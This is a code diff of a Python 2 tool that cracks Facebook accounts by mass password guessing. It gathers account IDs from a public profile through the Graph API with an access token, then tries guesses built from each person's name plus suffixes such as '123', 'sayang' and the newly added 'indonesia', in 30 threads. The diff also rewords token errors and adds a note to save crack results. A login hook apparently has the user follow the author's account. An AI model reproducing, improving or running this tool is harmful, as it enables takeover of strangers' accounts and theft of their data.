@@ -85,7 +85,7 @@ def login():
 		print(raka_logo)
 		print ' [1] Login With Token Facebook '
 		print ' [0] Exit \n'
-		met_log = raw_input(" [\x1b[1;97m?\x1b[0m] Choose : ")
+		met_log = raw_input(" [\x1b[1;97m?\x1b[0m] Choose : \x1b[1;96m")
 		if met_log =="":
 			print '\n [!] Please Fill '; time.sleep(1)
 			login()
@@ -103,7 +103,7 @@ def tokenz():
 	try:
 		token = open('login_r.txt','r')
 	except (KeyError,IOError):
-		token = raw_input(' [?] Token : ')
+		token = raw_input(' [?] Token : \x1b[1;96m')
 		try:
 			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
 			a = json.loads(otw.text)
@@ -113,13 +113,13 @@ def tokenz():
 			follow_my_raka()
 			jalan(' [!] Login Succes....')
 		except KeyError:
-			print ' [!] Token Wrong '
+			print ' [!] Token Exfired '
 
 def follow_my_raka():
     try:
         token = open('login_r.txt', 'r').read()
     except IOError:
-        print(' Invalid Token ! ')
+        print(' Token Exfired ! ')
         jalan(' Please Login Again')
         os.system('rm -rf login_r.txt')
     kata_kata_cinta = random.choice(["Cinta sejati bukan berarti tidak terpisahkan. Itu hanya berarti dipisahkan, namun tidak ada yang berubah."," Aku tahu aku jatuh cinta padamu karena kenyataanku akhirnya lebih indah dari mimpiku.","Kamu adalah pikiran terakhir dalam pikiranku sebelum tertidur dan pikiran pertama ketika aku bangun setiap pagi.","Bagi dunia, kamu mungkin satu orang, tetapi bagi satu orang kamu adalah dunia.","Kamu telah mengganti mimpi burukku dengan mimpi indah, kekhawatiranku dengan kebahagiaan, dan ketakutanku dengan cinta.","Kamu mungkin memegang tanganku untuk sementara waktu, tetapi kamu memegang hatiku selamanya.","Kekasihku, janganlah engkau menangis, berbahagialah kekasihku, jangan ada duka yang menyelimutimu. Aku berharap kau selalu dalam keadaan bahagia meski dari jauh aku saja tak bisa membahagiakanmu dan membuatmu tertawa.","Ketika seseorang membuat kamu menjadi orang yang paling bahagia dan orang paling menyedihkan pada saat yang sama, itulah saat yang nyata. Itu adalah sesuatu yang berharga.","Tidak peduli berapa banyak perkelahian yang mungkin kamu alami, jika kamu benar-benar mencintai seseorang, itu tidak akan menjadi masalah pada akhirnya.","Dicintai secara mendalam oleh seseorang memberimu kekuatan. Mencintai seseorang secara mendalam memberimu keberanian.","Cinta sejati tidak harus berarti menyatu, terkadang cinta sejati itu terpisah namun tak ada yang berubah.","Saat pagi datang, senyumanmu memeluk pikiranku, saat siang datang kau bagaikan payung yang selalu membuatku teduh, dan saat malam kau adalah kehangatan yang selalu membuatku jauh dari kedinginan.","Mencintai merupakan sebuah anugerah besar yang Tuhan berikan kepada manusia. Maka dari itu, kita perlu senantiasa bersyukur dan menjaga segala anugerah itu.","Mungkin ketidaksempurnaan kita yang membuat kita begitu sempurna satu sama lain.","Aku yakin bahwa cinta kita nanti akan bersatu dalam ikatan suci."])
@@ -149,7 +149,7 @@ def menu():
 	try:
 		token = open('login_r.txt','r').read()
 	except IOError:
-		jalan(' [!] Token Invalid ')
+		jalan(' [!] Token Exfired ')
 		os.system('clear')
 		os.system('rm -rf login_r.txt')
 		login()
@@ -160,7 +160,7 @@ def menu():
 		id = a['id']
 	except KeyError:
 		os.system('clear')
-		jalan(' [!] Invalid Token ')
+		jalan(' [!] Token Exfired ')
 		os.system('rm -rf login_r.txt')
 		login()
 	except requests.exceptions.ConnectionError:
@@ -197,7 +197,7 @@ def crack():
 	try:
 		token = open('login_r.txt', 'r').read()
 	except IOError:
-		print' [!] Invalid Token '
+		print' [!] Token Exfired '
 		tokenz()
 	ra_id = raw_input("[\x1b[1;97m-\x1b[0m] ID Public : ")
 	try:
@@ -230,7 +230,7 @@ def crack():
 			if len(ss)<3:
 				continue
 			else:
-				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5 or len(ss) == 6 or len(ss) == 7:
+				if len(ss) == 1 and len(ss) == 2 and len(ss) == 3 and len(ss) == 4 or len(ss) == 5 or len(ss) == 6 or len(ss) == 7 or len(ss) == 8:
 					ra_pw.append(name)
 					ra_pw.append(ss+"12")
 					ra_pw.append(ss+"123")
@@ -238,6 +238,7 @@ def crack():
 					ra_pw.append(ss+"12345")
                                         ra_pw.append(ss+"bismillah")
                                         ra_pw.append(ss+"sayang")
+                                        ra_pw.append(ss+"indonesia")
 				else:
 					ra_pw.append("000786")
 					ra_pw.append("786786")
@@ -281,6 +282,7 @@ def crack():
 			pass
 	p = ThreadPool(30)
 	p.map(main, id)
+	print("\x1b[1;97mSimpan Hasil Crack Selama \x1b[1;96m3 Hari ...\x1b[1;97m")
 	exit(' \n[!] Finished ')
 
 if __name__ == '__main__':
